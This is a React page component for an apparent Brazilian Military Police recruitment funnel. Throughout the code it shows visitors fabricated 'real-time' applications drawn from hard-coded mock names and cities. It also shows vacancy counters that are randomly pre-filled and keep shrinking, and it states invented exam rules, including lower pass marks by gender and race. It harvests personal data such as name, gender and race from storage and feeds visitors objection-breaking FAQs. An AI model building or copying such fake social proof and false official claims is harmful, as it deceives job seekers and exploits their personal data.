import { useState, useEffect } from 'react';
import { Link, useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Loader2 } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { getExamDateFormatted } from '@/utils/examDate';
import { useEstadoPM } from '@/hooks/useEstadoPM';

interface AssessmentData {
  situacao_ocupacional: string;
  escolaridade: string;
  estado_civil: string;
  filhos: string;
  renda_familiar: string;
  tempo_livre: string;
  concurso_pm_anterior: string;
  motivo_pm: string;
  deslocamento: string;
  presenca_feminina?: string;
  cuidados_familiares?: string;
  area_atuacao?: string;
}

interface CargoInfo {
  id: string;
  title: string;
  rank: string;
  requiredEducation: string;
  salary: string;
  description: string;
  requirements: string[];
  benefits: string[];
  duration: string;
  workSchedule: string;
  specializations: string[];
  profileMatch: number;
  matchReasons: string[];
  examInfo: {
    questions: number;
    passingPercentage: number;
    subjects: string[];
  };
}

interface ExamLocation {
  name: string;
  address: string;
  distance: number;
  type: string;
  place_id: string;
  phone?: string;
  rating?: number;
}

interface LocaisProvaResponse {
  success: boolean;
  fonte?: 'google_places' | 'csv';
  error?: string;
  data: {
    cep_consultado: string;
    municipio: string;
    uf: string;
    total_locais_encontrados: number;
    locais_prova: Array<{
      place_id: string;
      nome: string;
      endereco: string;
      distancia_km: number | null;
      latitude?: number | null;
      longitude?: number | null;
      tipos?: string[];
      type?: string;
    }>;
  };
}

// Mock data for real-time applications
const mockNames = [
  "João Silva", "Maria Santos", "Carlos Oliveira", "Ana Costa", "Pedro Almeida",
  "Juliana Lima", "Fernando Rodrigues", "Camila Ferreira", "Rafael Pereira", "Letícia Souza",
  "Marcos Barbosa", "Fernanda Martins", "Gabriel Nascimento", "Larissa Gomes", "Diego Cardoso",
  "Beatriz Campos", "Lucas Ribeiro", "Giovanna Dias", "Matheus Carvalho", "Isabella Torres",
  "Eduardo Araujo", "Yasmin Moreira", "Thiago Mendes", "Amanda Rocha", "Vinicius Correia",
  "Sofia Mendes", "Guilherme Santos", "Laura Oliveira", "Bruno Costa", "Clara Almeida",
  "Felipe Lima", "Mariana Rodrigues", "Gustavo Ferreira", "Alice Pereira", "Enzo Souza",
  "Lívia Barbosa", "Daniel Martins", "Valentina Nascimento", "Samuel Gomes", "Helena Cardoso",
  "Arthur Campos", "Manuela Ribeiro", "Bernardo Dias", "Sophia Carvalho", "Miguel Torres",
  "Luiza Araujo", "Davi Moreira", "Lorena Mendes", "Nicolas Rocha", "Júlia Correia",
  "Leonardo Silva", "Elisa Santos", "Henrique Oliveira", "Gabriela Costa", "Theo Almeida",
  "Rafaela Lima", "Caio Rodrigues", "Lara Ferreira", "Vitor Pereira", "Bianca Souza",
  "André Barbosa", "Cecília Martins", "Benício Nascimento", "Eloá Gomes", "Murilo Cardoso",
  "Stella Campos", "Joaquim Ribeiro", "Aurora Dias", "Lorenzo Carvalho", "Maitê Torres",
  "Calebe Araujo", "Luna Moreira", "Heitor Mendes", "Lívia Rocha", "Vicente Correia",
  "Esther Silva", "Breno Santos", "Marina Oliveira", "Ícaro Costa", "Lívia Almeida",
  "Emanuel Lima", "Nina Rodrigues", "Davi Lucas Ferreira", "Lia Pereira", "Otávio Souza",
  "Liz Barbosa", "Thomas Martins", "Isadora Nascimento", "Noah Gomes", "Clara Cardoso",
  "Pietro Campos", "Melissa Ribeiro", "Enrico Dias", "Bella Carvalho", "Anthony Torres",
  "Milena Araujo", "Cauã Moreira", "Evelyn Mendes", "Dominic Rocha", "Agatha Correia",
  "Eduarda Silva", "Luan Santos", "Rebeca Oliveira", "Tomás Costa", "Mirella Almeida",
  "Igor Lima", "Laís Rodrigues", "Davi Miguel Ferreira", "Sarah Pereira", "Benjamim Souza",
  "Heloísa Barbosa", "Valentim Martins", "Micaela Nascimento", "Levi Gomes", "Antonella Cardoso",
  "Elias Campos", "Alícia Ribeiro", "Nathan Dias", "Yara Carvalho", "César Torres",
  "Lavínia Araujo", "Bento Moreira", "Malu Mendes", "Zoe Rocha", "Augusto Correia",
  "Luana Silva", "Ravi Santos", "Emilly Oliveira", "Dante Costa", "Isis Almeida",
  "Joana Lima", "Kauê Rodrigues", "Mirela Ferreira", "Lucca Pereira", "Allana Souza",
  "Eduardo Barbosa", "Clarissa Martins", "Frederico Nascimento", "Lara Gomes", "Vicente Cardoso",
  "Mila Campos", "Breno Ribeiro", "Tainá Dias", "Otto Carvalho", "Elis Torres",
  "Lara Araujo", "Davi Luiz Moreira", "Sabrina Mendes", "Martim Rocha", "Lia Correia",
  "Ana Clara Silva", "Mateus Santos", "Lívia Oliveira", "Caio Costa", "Beatriz Almeida",
  "Thiago Lima", "Luiza Rodrigues", "Gabriel Ferreira", "Isabel Pereira", "João Pedro Souza",
  "Manuela Barbosa", "Rafael Martins", "Sofia Nascimento", "Lucas Gomes", "Marina Cardoso",
  "Arthur Campos", "Clara Ribeiro", "Felipe Dias", "Larissa Carvalho", "Vinicius Torres",
  "Eduarda Araujo", "Yasmin Moreira", "Guilherme Mendes", "Laura Rocha", "Bruno Correia",
  "Camila Silva", "Diego Santos", "Beatriz Oliveira", "Pedro Costa", "Juliana Almeida",
  "Fernando Lima", "Mariana Rodrigues", "Gustavo Ferreira", "Alice Pereira", "Enzo Souza",
  "Lívia Barbosa", "Daniel Martins", "Valentina Nascimento", "Samuel Gomes", "Helena Cardoso",
  "Arthur Campos", "Manuela Ribeiro", "Bernardo Dias", "Sophia Carvalho", "Miguel Torres",
  "Luiza Araujo", "Davi Moreira", "Lorena Mendes", "Nicolas Rocha", "Júlia Correia",
  "Leonardo Silva", "Elisa Santos", "Henrique Oliveira", "Gabriela Costa", "Theo Almeida",
  "Rafaela Lima", "Caio Rodrigues", "Lara Ferreira", "Vitor Pereira", "Bianca Souza",
  "André Barbosa", "Cecília Martins", "Benício Nascimento", "Eloá Gomes", "Murilo Cardoso",
  "Stella Campos", "Joaquim Ribeiro", "Aurora Dias", "Lorenzo Carvalho", "Maitê Torres",
  "Calebe Araujo", "Luna Moreira", "Heitor Mendes", "Lívia Rocha", "Vicente Correia",
  "Esther Silva", "Breno Santos", "Marina Oliveira", "Ícaro Costa", "Lívia Almeida",
  "Emanuel Lima", "Nina Rodrigues", "Davi Lucas Ferreira", "Lia Pereira", "Otávio Souza",
  "Liz Barbosa", "Thomas Martins", "Isadora Nascimento", "Noah Gomes", "Clara Cardoso",
  "Pietro Campos", "Melissa Ribeiro", "Enrico Dias", "Bella Carvalho", "Anthony Torres",
  "Milena Araujo", "Cauã Moreira", "Evelyn Mendes", "Dominic Rocha", "Agatha Correia",
  "Eduarda Silva", "Luan Santos", "Rebeca Oliveira", "Tomás Costa", "Mirella Almeida",
  "Igor Lima", "Laís Rodrigues", "Davi Miguel Ferreira", "Sarah Pereira", "Benjamim Souza",
  "Heloísa Barbosa", "Valentim Martins", "Micaela Nascimento", "Levi Gomes", "Antonella Cardoso",
  "Elias Campos", "Alícia Ribeiro", "Nathan Dias", "Yara Carvalho", "César Torres",
  "Lavínia Araujo", "Bento Moreira", "Malu Mendes", "Zoe Rocha", "Augusto Correia",
  "Luana Silva", "Ravi Santos", "Emilly Oliveira", "Dante Costa", "Isis Almeida",
  "Joana Lima", "Kauê Rodrigues", "Mirela Ferreira", "Lucca Pereira", "Allana Souza",
  "Eduardo Barbosa", "Clarissa Martins", "Frederico Nascimento", "Lara Gomes", "Vicente Cardoso",
  "Mila Campos", "Breno Ribeiro", "Tainá Dias", "Otto Carvalho", "Elis Torres",
  "Lara Araujo", "Davi Luiz Moreira", "Sabrina Mendes", "Martim Rocha", "Lia Correia",
  "Ana Clara Silva", "Mateus Santos", "Lívia Oliveira", "Caio Costa", "Beatriz Almeida",
  "Thiago Lima", "Luiza Rodrigues", "Gabriel Ferreira", "Isabel Pereira", "João Pedro Souza",
  "Manuela Barbosa", "Rafael Martins", "Sofia Nascimento LZ", "Lucas Gomes", "Marina Cardoso"
];

const mockCities = [
  "São Paulo", "Rio de Janeiro", "Brasília", "Belo Horizonte", "Recife",
  "Salvador", "Fortaleza", "Curitiba", "Porto Alegre", "Goiânia",
  "Belém", "Manaus", "São Luís", "Natal", "João Pessoa",
  "Aracaju", "Maceió", "Teresina", "Cuiabá", "Campo Grande",
  "Vitória", "Florianópolis", "Palmas", "Porto Velho", "Boa Vista",
  "Macapá", "Rio Branco", "Campinas", "Santos", "São José dos Campos",
  "Ribeirão Preto", "Uberlândia", "Sorocaba", "Osasco", "Jundiaí",
  "Londrina", "Maringá", "Joinville", "Blumenau", "Caxias do Sul",
  "Anápolis", "Aparecida de Goiânia", "Niterói", "Duque de Caxias", "São Bernardo do Campo",
  "Santo André", "Guarulhos", "Barueri", "Mauá", "Betim",
  "Contagem", "Uberaba", "Juiz de Fora", "Montes Claros", "Divinópolis",
  "Pelotas", "Bagé", "Santa Maria", "Canoas", "Gravataí",
  "Viamão", "Novo Hamburgo", "São Leopoldo", "Alvorada", "Passo Fundo",
  "Feira de Santana", "Ilhéus", "Itabuna", "Jequié", "Lauro de Freitas",
  "Olinda", "Jaboatão dos Guararapes", "Caruaru", "Petrolina", "Cabo de Santo Agostinho",
  "São José do Rio Preto", "Piracicaba", "Bauru", "Franca", "Taubaté",
  "Praia Grande", "Guarujá", "Diadema", "Itaquaquecetuba", "Mogi das Cruzes",
  "São Carlos", "Araraquara", "Jacareí", "Itu", "Indaiatuba",
  "Cotia", "Taboão da Serra", "Sumaré", "Americana", "Marília",
  "Presidente Prudente", "Araçatuba", "Barretos", "Catanduva", "Pindamonhangaba",
  "Poços de Caldas", "Patos de Minas", "Sete Lagoas", "Ipatinga", "Governador Valadares",
  "Varginha", "Pouso Alegre", "Barbacena", "Sabará", "Itabira",
  "Cachoeiro de Itapemirim", "Linhares", "Colatina", "Guarapari", "Serra",
  "Vila Velha", "Cariacica", "Castanhal", "Parauapebas", "Marabá",
  "Santarém", "Bragança", "Abaetetuba", "Cametá", "Tucuruí",
  "Bacabal", "Caxias", "Codó", "Timon", "Imperatriz",
  "Garanhuns", "Vitória de Santo Antão", "Igarassu", "Paulista", "Gravatá",
  "Santa Cruz do Capibaribe", "Arcoverde", "Ouricuri", "Serra Talhada", "Pesqueira",
  "São Caetano do Sul", "Itapecerica da Serra", "Hortolândia", "Limeira", "Jaú",
  "Botucatu", "Tatuí", "Itapetininga", "Ribeirão Pires", "Suzano",
  "Ferraz de Vasconcelos", "Poá", "Embu das Artes", "Francisco Morato", "Itapevi",
  "Jandira", "Carapicuíba", "Atibaia", "Bragança Paulista", "Mogi Guaçu",
  "Mogi Mirim", "Valinhos", "Vinhedo", "Louveira", "Jaguariúna",
  "Araras", "Rio Claro", "Leme", "Santa Bárbara d'Oeste", "Paulínia",
  "Assis", "Ourinhos", "Avaré", "Lençóis Paulista", "Pederneiras",
  "Tupã", "Dracena", "Andradina", "Fernandópolis", "Votuporanga",
  "Birigui", "Penápolis", "Bebedouro", "Sertãozinho", "Matão",
  "Orlândia", "Jaboticabal", "Monte Alto", "Cravinhos", "Rincão",
  "Teófilo Otoni", "Ubá", "Muriaé", "Barroso", "Conselheiro Lafaiete",
  "Ouro Preto", "Mariana", "Ponte Nova", "Viçosa", "Carangola",
  "Manhuaçu", "Além Paraíba", "Cataguases", "Leopoldina", "Itaperuna",
  "Campos dos Goytacazes", "Macaé", "Volta Redonda", "Barra Mansa", "Resende",
  "Angra dos Reis", "Araruama", "Cabo Frio", "Saquarema", "Itaboraí",
  "São Gonçalo", "Maricá", "Magé", "Nova Iguaçu", "Belford Roxo",
  "Mesquita", "Queimados", "São João de Meriti", "Nilópolis", "Itaguaí",
  "Paracambi", "Japeri", "Santa Cruz do Sul", "Lajeado", "Venâncio Aires",
  "Farroupilha", "Bento Gonçalves", "Erechim", "Ijuí", "Urug uiana",
  "Cruz Alta", "Santo Ângelo", "Cachoeira do Sul", "Santana do Livramento", "Alegrete",
  "Dom Pedrito", "Rosário do Sul", "São Borja", "São Gabriel", "Caçapava do Sul",
  "Camaquã", "Guaíba", "Eldorado do Sul", "Charqueadas", "Taquara",
  "Parobé", "Igrejinha", "Canela", "Gramado", "Nova Petrópolis",
  "São Sebastião do Caí", "Montenegro", "Triunfo", "Estrela", "Teutônia",
  "Ananindeua", "Marituba", "Benevides", "Barcarena", "Vigia",
  "Santo Antônio do Tauá", "Santa Isabel do Pará", "Salinópolis", "Capanema", "Breves",
  "Altamira", "Itaituba", "Oriximiná", "Monte Alegre", "Almeirim",
  "Portel", "Juruti", "Óbidos", "Prainha", "Curuá",
  "São Bento", "Pinheiro", "Santa Inês", "Rosário", "Buriticupu",
  "Grajaú", "Balsas", "Carolina", "Porto Franco", "Estreito",
  "Carpina", "Limoeiro", "Surubim", "Palmares", "Goiana",
  "Escada", "Timbaúba", "São Lourenço da Mata", "Moreno", "Bezerros"
];

const generateRandomApplication = () => {
  const name = mockNames[Math.floor(Math.random() * mockNames.length)];
  const city = mockCities[Math.floor(Math.random() * mockCities.length)];
  const positions = ["Soldado PM 2ª Classe", "Oficial PM"];
  const position = positions[Math.floor(Math.random() * positions.length)];
  
  return {
    id: Math.random().toString(36).substr(2, 9),
    candidateName: name,
    positionTitle: position,
    city: city,
    timestamp: new Date()
  };
};

// Função para gerar perguntas frequentes personalizadas
const getPersonalizedFAQs = (assessmentData: AssessmentData | null, userData: any, isWoman: boolean, sigla: string) => {
  const faqs = [];

  // Pergunta básica sempre presente
  faqs.push({
    question: `Preciso ter experiência prévia em segurança pública para me inscrever no Concurso ${sigla}?`,
    answer: `Não. O Concurso Público da ${sigla} é aberto a qualquer cidadão que atenda os requisitos do edital — ensino médio completo para Soldado PM 2ª Classe e ensino superior completo (qualquer área) para Oficial PM — além de idade mínima de 18 anos, idoneidade e aptidão física e mental. Nenhuma experiência prévia na área de segurança é exigida.`
  });

  // Perguntas baseadas na situação ocupacional
  if (assessmentData?.situacao_ocupacional === 'empregado_privado' || assessmentData?.situacao_ocupacional === 'servidor_publico') {
    faqs.push({
      question: `Trabalho atualmente. Consigo participar de todas as etapas do Concurso ${sigla}?`,
      answer: `Sim. As etapas — prova objetiva, teste de aptidão física (TAF), exames médicos e, para aprovados, curso de formação — são agendadas com antecedência e divulgadas no edital, o que permite planejamento da sua rotina profissional.`
    });
  }

  // Perguntas baseadas na escolaridade
  if (assessmentData?.escolaridade === 'ensino_fundamental') {
    faqs.push({
      question: `Tenho apenas o ensino fundamental. Posso participar do Concurso ${sigla}?`,
      answer: `Para este concurso, o requisito mínimo é o ensino médio completo (cargo de Soldado PM 2ª Classe). Recomendamos que você conclua o ensino médio para poder se inscrever nas próximas edições do concurso.`
    });
  }

  if (assessmentData?.escolaridade === 'ensino_medio' || assessmentData?.escolaridade === 'curso_tecnico') {
    faqs.push({
      question: `Tenho ensino médio completo. Qual cargo da ${sigla} se encaixa no meu perfil?`,
      answer: `O cargo de Soldado PM 2ª Classe exige ensino médio completo e é o ponto de entrada mais acessível do concurso. Após o Curso de Formação de Soldados (CFSD), você ingressa na corporação com estabilidade e progressão de carreira.`
    });
  }

  if (assessmentData?.escolaridade === 'superior_cursando' || assessmentData?.escolaridade === 'superior_concluido') {
    faqs.push({
      question: `Tenho ensino superior. Posso me inscrever no cargo de Oficial PM?`,
      answer: `Sim. O cargo de Oficial PM exige diploma de nível superior em qualquer área reconhecida pelo MEC. Você também pode se inscrever para Soldado PM 2ª Classe, se preferir. Ambos os cargos oferecem estabilidade e benefícios do serviço público estadual.`
    });
  }

  // Perguntas baseadas no motivo de ingresso
  if (assessmentData?.motivo_pm === 'vocacao') {
    faqs.push({
      question: `Sempre quis servir e proteger a sociedade. Isso é levado em conta na seleção?`,
      answer: `Sim. A vocação para o serviço público de segurança é um dos pilares avaliados durante o curso de formação e ao longo da carreira. Candidatos motivados pela missão de proteger a população costumam se adaptar melhor à rotina e à disciplina da corporação.`
    });
  }

  if (assessmentData?.tempo_livre === 'esportes') {
    faqs.push({
      question: `Pratico esportes regularmente. Isso ajuda no Teste de Aptidão Física (TAF)?`,
      answer: `Ajuda muito. O TAF avalia corrida, flexões, abdominais e outros exercícios físicos eliminatórios. Candidatos com rotina esportiva consolidada chegam com vantagem física considerável para essa etapa do concurso.`
    });
  }

  // Perguntas específicas para mulheres
  if (isWoman) {
    faqs.push({
      question: `As mulheres têm as mesmas condições de aprovação que os homens no Concurso ${sigla}?`,
      answer: `Sim. Os critérios de seleção são integralmente iguais para todos os candidatos, com parâmetros de TAF adaptados fisiologicamente. O edital garante igualdade de condições e oportunidades para candidatas femininas em todas as etapas do processo e em todas as áreas de atuação — operacional e administrativa.`
    });

    if (assessmentData?.cuidados_familiares === 'sim_organizo') {
      faqs.push({
        question: `Tenho filhos e responsabilidades familiares. O curso de formação é compatível?`,
        answer: `O curso de formação tem carga intensiva, mas o cronograma é divulgado com antecedência para planejamento familiar. Após a formatura, a escala de serviço varia por batalhão, e a corporação possui políticas de apoio à maternidade e à conciliação entre vida familiar e profissional.`
      });
    }
  }

  // Perguntas sobre idade
  const idade = userData?.dataAniversario ?
    new Date().getFullYear() - new Date(userData.dataAniversario).getFullYear() : null;

  if (idade && idade > 35) {
    faqs.push({
      question: `Tenho mais de 35 anos. Ainda posso participar do Concurso ${sigla}?`,
      answer: `Sim, desde que atenda ao limite de idade estabelecido no edital (em geral até 30-35 anos para ingresso, variando por estado). Candidatos com mais maturidade costumam lidar melhor com a disciplina hierárquica e o atendimento à população.`
    });
  }

  if (idade && idade < 25) {
    faqs.push({
      question: `Sou jovem e estou no início da carreira. Vale a pena participar do Concurso ${sigla}?`,
      answer: `Vale muito. É uma das melhores portas de entrada para o serviço público estadual, com estabilidade garantida, estrutura de carreira definida por lei e possibilidade de progressão até os postos mais altos da corporação ao longo dos anos.`
    });
  }

  // Perguntas sobre disponibilidade de deslocamento
  if (assessmentData?.deslocamento === 'plena' || assessmentData?.deslocamento === 'regiao') {
    faqs.push({
      question: `Tenho disponibilidade para servir em outra cidade. Isso conta a meu favor?`,
      answer: `Sim. A disponibilidade para servir em batalhões do interior ou de regiões com maior carência de efetivo é considerada um diferencial positivo na distribuição de vagas após a formatura.`
    });
  }

  if (assessmentData?.concurso_pm_anterior === 'primeira_vez') {
    faqs.push({
      question: `Esta é minha primeira tentativa no concurso da ${sigla}. Isso é um problema?`,
      answer: `Não é um problema. A maioria dos aprovados está em sua primeira ou segunda tentativa. O conteúdo do concurso é público e delimitado pelo edital, e existem cursos preparatórios específicos disponíveis para cada etapa — prova objetiva, TAF e exames.`
    });
  }

  // Pergunta financeira sempre presente
  faqs.push({
    question: `Quanto vou ganhar e quais são os benefícios do cargo na ${sigla}?`,
    answer: `O Soldado PM 2ª Classe recebe vencimento inicial mais auxílio-alimentação após a conclusão do curso de formação. O Oficial PM tem remuneração superior. Ambos os cargos incluem estabilidade no serviço público estadual, 13º salário, férias remuneradas, plano de saúde e progressão de carreira ao longo dos anos de serviço.`
  });

  return faqs.slice(0, 8);
};

export default function TemporariosPage() {
  const [, setLocation] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const nomeCorpo = estadoPM?.nomeCompleto ?? 'Polícia Militar';
  const [assessmentData, setAssessmentData] = useState<AssessmentData | null>(null);
  const [availablePositions, setAvailablePositions] = useState<CargoInfo[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [selectedPosition, setSelectedPosition] = useState<CargoInfo | null>(null);
  const [examLocations, setExamLocations] = useState<ExamLocation[]>([]);
  const [selectedLocation, setSelectedLocation] = useState<string>('');
  const [selectedTime, setSelectedTime] = useState<string>('14:00');
  const [isLoadingLocations, setIsLoadingLocations] = useState(false);
  const [locaisProvaData, setLocaisProvaData] = useState<LocaisProvaResponse['data'] | null>(null);
  const [isApplying, setIsApplying] = useState<string | null>(null);
  const [loadingStep, setLoadingStep] = useState(0);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [isWoman, setIsWoman] = useState(false);
  const [firstName, setFirstName] = useState<string>('');

  const [personalizedFAQs, setPersonalizedFAQs] = useState<any>(null);
  const [isLoadingFAQs, setIsLoadingFAQs] = useState(false);
  const [userData, setUserData] = useState<any>(null);
  const { trackEvent, trackGenderSelection } = useClarityEvents();
  
  // Real-time urgency system
  const [realtimeApplications, setRealtimeApplications] = useState<Array<{
    id: string;
    candidateName: string;
    positionTitle: string;
    city: string;
    timestamp: Date;
  }>>([]);
  const [positionStats, setPositionStats] = useState<Record<string, {
    totalVagas: number;
    vagasPreenchidas: number;
    percentageRemaining: number;
  }>>({});

  // Real-time applications system
  useEffect(() => {
    // Start real-time application notifications immediately
    const addRandomApplication = () => {
      const newApp = generateRandomApplication();
      setRealtimeApplications(prev => [newApp, ...prev.slice(0, 4)]); // Keep only last 5
    };

    // Add initial applications
    const initialApps = Array.from({ length: 3 }, () => generateRandomApplication());
    setRealtimeApplications(initialApps);

    // Continue adding applications every 8-15 seconds
    const appInterval = setInterval(() => {
      addRandomApplication();
    }, Math.random() * 7000 + 8000); // Random between 8-15 seconds

    return () => clearInterval(appInterval);
  }, []);

  // Position stats system
  useEffect(() => {
    // Initialize position stats
    const initialStats: Record<string, any> = {};
    const basePositions = [
      { id: 'soldado-pm', title: 'Soldado PM 2ª Classe', total: estadoPM?.vagasSoldado ?? 2000 },
      { id: 'oficial-pm', title: 'Oficial PM', total: estadoPM?.vagasOficial ?? 150 }
    ];

    basePositions.forEach(pos => {
      const filled = Math.floor(pos.total * (0.65 + Math.random() * 0.25)); // 65-90% filled
      initialStats[pos.id] = {
        totalVagas: pos.total,
        vagasPreenchidas: filled,
        percentageRemaining: ((pos.total - filled) / pos.total) * 100
      };
    });

    setPositionStats(initialStats);

    // Update stats periodically to show decreasing availability
    const statsInterval = setInterval(() => {
      setPositionStats(prev => {
        const updated = { ...prev };
        Object.keys(updated).forEach(key => {
          if (Math.random() < 0.3) { // 30% chance to update each position
            const increase = Math.floor(Math.random() * 3) + 1; // Increase by 1-3
            updated[key] = {
              ...updated[key],
              vagasPreenchidas: Math.min(
                updated[key].vagasPreenchidas + increase,
                updated[key].totalVagas
              ),
              percentageRemaining: Math.max(
                0,
                ((updated[key].totalVagas - updated[key].vagasPreenchidas - increase) / updated[key].totalVagas) * 100
              )
            };
          }
        });
        return updated;
      });
    }, 12000); // Update every 12 seconds

    return () => clearInterval(statsInterval);
  }, [estadoPM]);


  // Função para buscar FAQ personalizado que quebra objeções
  const fetchPersonalizedFAQs = async () => {
    try {
      setIsLoadingFAQs(true);
      
      const userData = localStorage.getItem('userData');
      const pessoalData = localStorage.getItem('pessoalData');
      
      if (!userData || !pessoalData) {
        return;
      }

      const response = await fetch('/api/faq-personalizado', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userData: JSON.parse(userData),
          pessoalData: JSON.parse(pessoalData)
        })
      });

      const result = await response.json();
      
      if (result.success && result.data.faqs) {
        setPersonalizedFAQs(result.data);
        
        // Track FAQ generation completion
        trackEvent('personalized_faq_generated', {
          page: 'temporarios_page',
          faq_count: result.data.faqs.length,
          candidate_profile: result.data.candidato
        });
      } else {
        console.error('Erro na geração do FAQ:', result.error);
        // Em caso de erro na API, não define personalizedFAQs para usar o fallback
      }
    } catch (error) {
      console.error('Erro ao buscar FAQ personalizado:', error);
      // Em caso de erro na API, não define personalizedFAQs para usar o fallback
    } finally {
      setIsLoadingFAQs(false);
    }
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Facebook Pixel - Search event
    const fbq = (window as any).fbq;
    if (fbq) {
      fbq('track', 'Search', {
        content_name: 'Programa Nacional de Apoio ao Serviço Público',
        content_category: 'Position Search',
        value: 6893.00,
        currency: 'BRL'
      });
    }
    
    // Check gender from userData and track page entry
    const userData = localStorage.getItem('userData');
    if (userData) {
      try {
        const parsedUserData = JSON.parse(userData);
        const gender = parsedUserData.genero || parsedUserData.autoFilledData?.sexo;
        
        // Extract first name from userData
        const nomeCompleto = parsedUserData.nomeCompleto || parsedUserData.autoFilledData?.nome || parsedUserData.name;
        if (nomeCompleto) {
          const primeiroNome = nomeCompleto.split(' ')[0];
          const nomeFormatado = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
          setFirstName(nomeFormatado);
        }
        
        if (gender === 'feminino' || gender === 'f' || gender === 'F') {
          setIsWoman(true);
          trackGenderSelection('feminino', 'temporarios_page_load');
        } else if (gender === 'masculino' || gender === 'm' || gender === 'M') {
          trackGenderSelection('masculino', 'temporarios_page_load');
        }
        
        // Track position selection page entry
        trackEvent('position_selection_page_entered', {
          page: 'temporarios_page',
          user_gender: gender,
          has_assessment_data: !!localStorage.getItem('pessoalData'),
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.log('Error loading user data:', error);
      }
    }
    
    // Load assessment data from localStorage
    const savedData = localStorage.getItem('pessoalData');
    if (savedData) {
      try {
        const parsedData = JSON.parse(savedData);
        setAssessmentData(parsedData);
        
        // Generate available positions based on assessment
        const positions = generateAvailablePositions(parsedData);
        setAvailablePositions(positions);
        
        // Also set userData from localStorage for FAQ generation
        const savedUserData = localStorage.getItem('userData');
        if (savedUserData) {
          try {
            const parsedUserData = JSON.parse(savedUserData);
            setUserData(parsedUserData);
          } catch (error) {
            console.log('Error loading user data for FAQ:', error);
          }
        }
        
        // Fetch personalized FAQs after loading assessment data
        fetchPersonalizedFAQs();
      } catch (error) {
        console.log('Error loading assessment data:', error);
      }
    }
    
    // Simulate loading steps with messages
    const loadingSteps = isWoman ? [
      `Verificando elegibilidade para o Concurso ${sigla}...`,
      "Identificando cargos compatíveis com seu perfil...",
      "Calculando compatibilidade com as vagas disponíveis..."
    ] : [
      "Verificando elegibilidade do candidato...",
      `Cruzando perfil com os cargos do Concurso ${sigla}...`,
      "Calculando compatibilidade com as vagas disponíveis..."
    ];
    
    let currentStep = 0;
    setLoadingMessage(loadingSteps[0]);
    
    const interval = setInterval(() => {
      currentStep++;
      if (currentStep < loadingSteps.length) {
        setLoadingStep(currentStep);
        setLoadingMessage(loadingSteps[currentStep]);
      } else {
        clearInterval(interval);
        setIsLoading(false);
      }
    }, 1400);
    
    return () => clearInterval(interval);
  }, []);

  // Function to get race/color data and quota eligibility
  const getRacialQuotaInfo = (): { hasQuota: boolean; race: string; reductionPercentage: number } => {
    try {
      const dadosExtras = localStorage.getItem('dados-extras');
      if (dadosExtras) {
        const data = JSON.parse(dadosExtras);
        const cor = data?.DadosBasicos?.cor;
        if (cor && ['PARDA', 'PRETA'].includes(cor.toUpperCase())) {
          return {
            hasQuota: true,
            race: cor.toLowerCase(),
            reductionPercentage: (cor.toUpperCase() === 'PARDA' ? 10 : 15)
          };
        }
      }
    } catch (error) {
      console.error('Erro ao verificar dados de cota racial:', error);
    }
    return { hasQuota: false, race: '', reductionPercentage: 0 };
  };

  // Function to calculate exam passing percentage with quota adjustment
  const calculatePassingPercentage = (basePercentage: number, isWoman: boolean): number => {
    let adjustedPercentage = isWoman ? basePercentage - 15 : basePercentage; // Women get 15% reduction
    
    // Apply racial quota reduction if eligible
    const quotaInfo = getRacialQuotaInfo();
    if (quotaInfo.hasQuota) {
      adjustedPercentage = Math.max(adjustedPercentage - quotaInfo.reductionPercentage, 30); // Additional reduction, minimum 30%
    }
    
    return adjustedPercentage;
  };

  const generateAvailablePositions = (data: AssessmentData): CargoInfo[] => {
    const positions: CargoInfo[] = [];

    // Soldado PM 2ª Classe — nível médio
    positions.push({
      id: 'soldado-pm',
      title: 'Soldado PM 2ª Classe',
      rank: `${sigla} — Concurso Público 2026`,
      requiredEducation: 'Ensino Médio Completo',
      salary: 'R$ 4.972,00 + auxílio-alimentação R$ 658,00',
      description: `Responsável pelo policiamento ostensivo e preventivo nas ruas, atendimento de ocorrências, abordagens e apoio à população. Após aprovação, o candidato passa pelo Curso de Formação de Soldados (CFSD) da ${sigla} antes de assumir suas funções em um batalhão.`,
      requirements: [
        'Ensino Médio Completo',
        'Aprovação em todas as etapas do Concurso Público — prova objetiva, TAF, exames médicos e psicológicos',
        'Idade mínima de 18 anos',
        'Idoneidade moral e não ter sofrido condenação incompatível com o cargo'
      ],
      benefits: [
        'Vencimento inicial de R$ 4.972,00',
        'Auxílio-alimentação de R$ 658,00/mês',
        'Estabilidade no serviço público estadual',
        '13º salário e férias remuneradas de 30 dias',
        'Plano de saúde e assistência médica da corporação',
        'Progressão de carreira por antiguidade e mérito'
      ],
      duration: 'Cargo efetivo de provimento permanente — estabilidade após o estágio probatório',
      workSchedule: 'Escala de serviço conforme o batalhão — plantões e horário administrativo',
      specializations: getSpecializationsForProfile(data, 'soldado-pm'),
      profileMatch: calculateProfileMatch(data, 'soldado-pm'),
      matchReasons: getMatchReasons(data, 'soldado-pm', sigla),
      examInfo: {
        questions: 120,
        passingPercentage: calculatePassingPercentage(60, isWoman),
        subjects: ['Língua Portuguesa', 'Raciocínio Lógico e Matemática', 'Conhecimentos Gerais e Atualidades', 'Direito Constitucional', 'Teste de Aptidão Física (TAF)']
      }
    });

    // Oficial PM — nível superior
    positions.push({
      id: 'oficial-pm',
      title: 'Oficial PM',
      rank: `${sigla} — Concurso Público 2026`,
      requiredEducation: 'Ensino Superior Completo (qualquer área)',
      salary: 'R$ 9.834,00 + auxílio-alimentação R$ 658,00',
